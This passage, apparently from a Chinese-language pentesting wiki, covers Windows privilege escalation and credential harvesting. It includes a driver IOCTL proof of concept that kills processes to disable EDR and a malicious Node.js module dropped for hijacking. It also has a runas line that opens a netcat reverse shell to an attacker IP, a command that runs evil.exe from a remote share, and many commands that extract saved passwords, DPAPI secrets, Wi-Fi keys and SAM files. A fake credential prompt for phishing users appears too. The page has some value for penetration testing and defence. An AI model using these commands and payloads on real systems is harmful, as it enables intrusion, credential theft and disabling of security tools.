**阅读** **以下页面** 以了解更多有趣的 **autoruns locations to escalate privileges**：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

寻找可能的 **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果一个 driver 暴露了任意 kernel read/write primitive（在设计糟糕的 IOCTL handlers 中很常见），你可以通过直接从 kernel memory 中窃取一个 SYSTEM token 来提权。这里有逐步技术说明：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于 race-condition bugs，如果有漏洞的调用会打开一个由攻击者控制的 Object Manager path，故意减慢 lookup（使用最大长度 components 或很深的 directory chains）可以把窗口从微秒拉长到几十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

现代 hive vulnerabilities 允许你构建可预测的布局，滥用可写的 HKLM/HKU descendants，并在不使用 custom driver 的情况下把 metadata corruption 转换为 kernel paged-pool overflows。完整链条见这里：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` 直接模式的 type confusion，来自攻击者控制的 paths

一些 drivers 接受来自 userland 的 registry path，只验证它是一个合理的 UTF-16 string，然后调用 `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`，并使用 `RTL_QUERY_REGISTRY_DIRECT` 写入诸如 `int readValue` 这样的 stack scalar。如果缺少 `RTL_QUERY_REGISTRY_TYPECHECK`，`EntryContext` 的解释方式取决于**实际**的 registry type，而不是开发者预期的 type。

这会产生两个有用的 primitives：

- **Confused deputy / oracle**：攻击者控制的绝对 `\Registry\...` path 允许 driver 查询攻击者挑选的 keys，通过返回码/logs 泄漏是否存在，并且有时还能读取调用者无法直接访问的值。
- **Kernel memory corruption**：像 `&readValue` 这样的标量目标会根据 registry value type 被 type-confused 成 `REG_QWORD`、`UNICODE_STRING`，或带大小的 binary buffer。

实战利用说明：

- **Windows 8+ mitigation**：如果查询命中一个 **untrusted hive**，并且使用了 `RTL_QUERY_REGISTRY_DIRECT` 但没有 `RTL_QUERY_REGISTRY_TYPECHECK`，kernel callers 会以 `KERNEL_SECURITY_CHECK_FAILURE (0x139)` 崩溃。为了保持可利用性，应优先寻找**trusted system hives 中攻击者可写的 keys**，而不是把 values 放在 `HKCU` 下做 staging。
- **Trusted-hive staging**：使用 NtObjectManager 枚举 `\Registry\Machine` 下可写的 descendants，并用复制的 **low-integrity** token 重新运行扫描，寻找从 sandboxed contexts 可达的 keys：
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 8 字节的直接写入会写进 4 字节的 `int`，破坏相邻的栈数据，并且可能部分覆盖附近的 callback/function pointer。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode 期望 `EntryContext` 指向一个 `UNICODE_STRING`。如果代码先把攻击者控制的 `REG_DWORD` 读入一个栈标量，然后又把同一个缓冲区复用于字符串读取，攻击者就能控制 `Length`/`MaximumLength`，并部分影响 `Buffer` 指针，从而得到一个半受控的 kernel write。
- **`REG_BINARY`**: 对于大 binary 数据，direct mode 会把 `EntryContext` 处的第一个 `LONG` 当作有符号的缓冲区大小。如果先前的 `REG_DWORD` 读取在复用的标量里留下了一个**负数**、且由攻击者控制的值，那么下一次 `REG_BINARY` 查询会把攻击者字节直接拷贝到相邻的栈槽上，这通常是实现完整 callback-pointer overwrite 最干净的路径。

强力 hunting 模式：**在同一个栈变量里进行异构 registry reads，却没有重新初始化它**。搜索 `RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、重复使用的 `EntryContext` 指针，以及那些第一次 registry read 会控制第二次 read 是否发生的代码路径。

#### 利用 device objects 上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些已签名的第三方驱动会用强 SDDL 通过 IoCreateDeviceSecure 创建它们的 device object，但却忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有这个标志时，当 device 是通过包含额外组件的路径被打开时，secure DACL 不会被强制执行，这样任何低权限用户都能通过类似下面的 namespace path 获得一个 handle：

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（来自一个真实案例）

一旦用户能够打开该 device，驱动暴露出来的特权 IOCTLs 就可以被滥用来做 LPE 和篡改。现实中观察到的示例能力包括：
- 返回对任意进程的 full-access handles（通过 DuplicateTokenEx/CreateProcessAsUser 进行 token theft / SYSTEM shell）。
- 不受限制的 raw disk 读写（离线篡改、boot-time persistence 技巧）。
- 终止任意进程，包括 Protected Process/Light（PP/PPL），从而允许从 user land 通过 kernel 进行 AV/EDR kill。

最小 PoC 模式（user mode）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
开发者的缓解措施
- 在创建旨在受 DACL 限制的设备对象时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 为特权操作验证调用者上下文。在允许进程终止或返回 handle 之前，添加 PP/PPL 检查。
- 限制 IOCTLs（access masks、METHOD_*、输入验证），并考虑使用 brokered models，而不是直接使用 kernel privileges。

防御者的检测思路
- 监控对可疑 device names 的 user-mode 打开操作（例如，\\ .\\amsdk*）以及表明被滥用的特定 IOCTL sequences。
- 强制启用 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护你自己的 allow/deny lists。


## PATH DLL Hijacking

如果你在 PATH 中某个文件夹内拥有 **write permissions**，你可能可以劫持某个进程加载的 DLL，并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
更多关于如何滥用这个检查的信息：


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 通过 `C:\node_modules` 的 Node.js / Electron 模块解析劫持

这是一个 **Windows uncontrolled search path** 变体，影响 **Node.js** 和 **Electron** 应用程序，当它们执行类似 `require("foo")` 这样的裸导入，并且期望的模块 **缺失** 时。

Node 会通过沿目录树向上查找，并检查每个父目录中的 `node_modules` 文件夹来解析包。在 Windows 上，这种向上查找可以一直到达磁盘根目录，因此从 `C:\Users\Administrator\project\app.js` 启动的应用程序最终可能会探测：

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

如果 **低权限用户** 可以创建 `C:\node_modules`，他们就可以放置一个恶意的 `foo.js`（或 package 文件夹），并等待一个 **更高权限的 Node/Electron 进程** 去解析这个缺失的依赖。payload 会在受害进程的安全上下文中执行，因此当目标以管理员身份运行、从提权的 scheduled task/service wrapper 运行，或者从自动启动的高权限桌面应用运行时，这就会变成 **LPE**。

这种情况尤其常见于：

- 某个依赖被声明在 `optionalDependencies`
- 第三方库把 `require("foo")` 包在 `try/catch` 中，并在失败后继续执行
- 某个 package 已从生产构建中移除、在打包时被省略，或者安装失败
- 有漏洞的 `require()` 位于依赖树深处，而不是主应用代码中

### 寻找易受攻击的目标

使用 **Procmon** 来证明解析路径：

- 按 `Process Name` 过滤为目标可执行文件（`node.exe`、Electron 应用 EXE，或 wrapper 进程）
- 按 `Path` 包含 `node_modules` 过滤
- 重点关注 `NAME NOT FOUND` 以及在 `C:\node_modules` 下最终成功打开的项

在解包后的 `.asar` 文件或应用源码中，有用的代码审查模式：
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### 利用

1. 从 Procmon 或源码审查中识别 **缺失的 package 名称**。
2. 如果 root lookup 目录不存在，则创建它：
```powershell
mkdir C:\node_modules
```
3. 丢弃一个具有完全预期名称的 module:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 触发受害应用程序。如果应用程序尝试 `require("foo")`，而合法模块不存在，Node 可能会加载 `C:\node_modules\foo.js`。

符合这种模式的现实世界中缺失的可选模块示例包括 `bluebird` 和 `utf-8-validate`，但**technique** 才是可复用的部分：找到任何一个**缺失的 bare import**，让具有特权的 Windows Node/Electron 进程去解析它。

### Detection and hardening ideas

- 在用户创建 `C:\node_modules` 或在其中写入新的 `.js` 文件/package 时告警。
- 检测高完整性进程从 `C:\node_modules\*` 读取的行为。
- 在 production 中打包所有运行时依赖，并审计 `optionalDependencies` 的使用。
- 检查第三方代码中静默的 `try { require("...") } catch {}` 模式。
- 当 library 支持时，禁用 optional probes（例如，某些 `ws` deployments 可以通过 `WS_NO_UTF_8_VALIDATE=1` 避免使用旧的 `utf-8-validate` probe）。

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否有其他已知的硬编码电脑
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查 **restricted services**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**查看此页面获取与防火墙相关的命令**](../basic-cmd-for-pentesters.md#firewall) **（列出规则、创建规则、关闭、关闭...）**

更多[用于网络枚举的命令在这里](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到

如果你获得 root 用户权限，你可以监听任意端口（第一次使用 `nc.exe` 监听端口时，它会通过 GUI 询问是否允许防火墙放行 `nc`）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以 root 身份启动 bash，你可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault 存储用于服务器、网站和其他程序的用户凭据，这些程序可由 **Windows** **自动登录用户**。乍一看，这似乎意味着用户现在可以保存他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等，从而通过浏览器自动登录。但并不是这样。

Windows Vault 存储的是 Windows 可以自动登录用户所需的凭据，这意味着任何 **需要凭据来访问资源**（服务器或网站）的 **Windows 应用程序** 都可以使用这个 Credential Manager 和 Windows Vault，并用提供的凭据来代替用户一直输入用户名和密码。

除非应用程序与 Credential Manager 交互，否则我认为它们不可能使用某个资源的凭据。因此，如果你的应用程序想要使用 vault，它应该以某种方式 **与 credential manager 通信，并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用带有 `/savecred` 选项的 `runas` 来使用已保存的凭据。下面的示例是通过 SMB share 调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用提供的一组凭据运行 `runas`。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** 提供了一种对数据进行对称加密的方法，主要用于 Windows 操作系统中，对非对称 private keys 进行对称加密。此加密利用用户或系统 secret，显著增加 entropy。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。在涉及系统加密的场景中，它会使用系统的域认证 secret。

使用 DPAPI 加密的用户 RSA keys 存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI key 与保护该用户 private keys 的 master key 位于同一个文件中**，通常由 64 字节的随机数据组成。（需要注意的是，访问此目录会受到限制，无法通过 CMD 中的 `dir` 命令列出其内容，不过可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments (`/pvk` or `/rpc`) to decrypt it.

**由 master password 保护的 credentials files** 通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** 通常用于 **scripting** 和自动化任务，作为一种方便存储加密凭据的方式。这些凭据使用 **DPAPI** 进行保护，这通常意味着它们只能由创建它们的同一用户在同一台计算机上解密。

要从包含它的文件中 **decrypt** 一个 PS credentials，你可以这样做：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP Connections

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
以及 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 中找到它们

### 最近运行的 Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面 Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use **Mimikatz** `dpapi::rdg` 模块配合合适的 `/masterkey` 来**解密任何 .rdg 文件**\
你可以使用 Mimikatz `sekurlsa::dpapi` 模块从内存中提取许多 DPAPI masterkey

### Sticky Notes

人们经常在 Windows 工作站上使用 StickyNotes 应用来**保存密码**和其他信息，却没有意识到它是一个数据库文件。这个文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，始终值得搜索和检查。

### AppCmd.exe

**注意，要恢复 AppCmd.exe 中的密码，你需要是 Administrator 并在 High Integrity level 下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录中。\
如果这个文件存在，那么很可能已经配置了某些**credentials**，并且可以被**recovered**。

这段代码摘自 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在 .\
安装程序会以 **SYSTEM privileges** 运行，很多都容易受到 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和 Registry（Credentials）

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH keys

SSH private keys 可以存储在注册表项 `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查其中是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中找到任何条目，它很可能是一个已保存的 SSH key。它以加密形式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 轻松解密。\
关于这种 technique 的更多信息见： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` service 没有运行，而你希望它在启动时自动启动，请运行：
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个 technique 已经不再有效了。我尝试创建一些 ssh keys，用 `ssh-add` 添加它们，并通过 ssh 登录到一台 machine。注册表 `HKCU\Software\OpenSSH\Agent\Keys` 不存在，而且 procmon 也没有识别出在 asymmetric key authentication 期间使用 `dpapi.dll`。

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭据
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### Cached GPP Pasword

以前有一个功能可用于通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员账户。然而，这种方法存在严重的安全缺陷。首先，存储在 SYSVOL 中作为 XML 文件的 Group Policy Objects (GPOs) 可被任何域用户访问。其次，这些 GPP 中的密码使用公开记录的默认密钥通过 AES256 加密后，任何已认证用户都可以解密。这带来了严重风险，因为它可能允许用户获得更高权限。

为缓解这一风险，开发了一个函数用于扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。找到此类文件后，该函数会解密密码并返回一个自定义 PowerShell 对象。该对象包含有关 GPP 及其文件位置的详细信息，有助于识别并修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 中搜索这些文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
带有凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求凭据

你总是可以**请求用户输入他的凭据，甚至是另一个用户的凭据**，如果你认为他可能知道这些凭据（注意，直接向客户端**索要** **credentials** 是非常**冒险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知在过去某些时候包含**明文**或 **Base64** 格式**passwords**的文件
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Search all of the proposed files:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == 